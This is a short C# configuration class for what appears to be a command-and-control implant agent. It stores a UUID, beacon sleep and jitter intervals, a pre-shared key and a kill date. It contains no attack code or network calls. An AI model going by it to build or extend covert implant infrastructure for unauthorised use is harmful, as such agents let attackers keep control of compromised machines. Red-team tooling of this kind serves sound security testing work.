using Agent.Interfaces;

namespace Agent.Config
{
    public class AgentConfig : IAgentConfig
    {
        public string? uuid
        {
            get
            {
                return _uuid;
            }
            set
            {
                _uuid = value;
                if (SetAgentConfigUpdated is not null)
                {
                    SetAgentConfigUpdated(this, new EventArgs());
                }
            }
        }
        private string? _uuid;
        public int sleep { get; set; }
        public int jitter { get; set; }
        private string? _psk;
        public string? psk
        {
            get
            {
                return _psk;
            }
            set
            {
                _psk = value;
                if(SetAgentConfigUpdated is not null)
                {
                    SetAgentConfigUpdated(this, new EventArgs());
                }
            }
        }
        public DateTime killDate { get; set; }

        public AgentConfig()
        {
            sleep = 5;
            jitter = 5;
            uuid = "8e8f9ed0-83a4-4d59-8fd5-9aa87e153ac5";
            psk = "";
        }

        public event EventHandler? SetAgentConfigUpdated;
    }
}
